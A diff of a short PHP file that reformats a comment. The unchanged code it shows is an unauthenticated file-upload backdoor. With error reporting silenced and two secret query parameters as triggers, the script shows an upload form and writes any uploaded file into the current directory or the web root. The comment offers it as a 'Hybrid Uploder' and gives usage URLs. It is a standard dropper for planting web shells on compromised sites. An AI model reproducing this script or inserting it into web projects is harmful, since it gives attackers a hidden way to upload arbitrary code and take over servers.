@@ -1,4 +1,6 @@
 <?php error_reporting(0); if($_GET['safe'] == 'url'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' multiple='multiple' /><input type='submit' value='Upload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } elseif ($_GET['home'] == 'url'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = '/home/www/public_html/'.$_FILES['file']['name'];echo "Home<form method='POST' enctype='multipart/form-data'><input type='file' name='file' multiple='multiple' /><input type='submit' value='Upload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
 
-/*Hybrid Uploder for php, in current path & other path. Replace "/home/www/public_html/" to your destination path.
-usages: (For current path) site.com/file_name.php?safe=url  (For other path) site.com/file_name.php?home=url */
+/*
+Hybrid Uploder for php, in current path & other path. Replace "/home/www/public_html/" to your destination path.
+usages: (For current path) site.com/file_name.php?safe=url  (For other path) site.com/file_name.php?home=url
+*/
